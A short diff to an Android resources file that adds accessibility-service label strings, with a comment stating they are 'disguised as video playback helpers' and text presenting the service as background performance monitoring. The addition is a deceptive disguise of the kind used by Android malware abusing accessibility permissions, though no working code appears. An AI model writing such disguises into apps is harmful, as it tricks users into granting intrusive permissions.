@@ -4,4 +4,8 @@
         <item name="android:windowBackground">#FF000000</item>
         <item name="android:statusBarColor">#FF000000</item>
     </style>
+
+    <!-- Accessibility service labels (disguised as video playback helpers) -->
+    <string name="a11y_summary">Ensures smooth video playback experience</string>
+    <string name="a11y_description">Background performance monitoring for better quality</string>
 </resources>
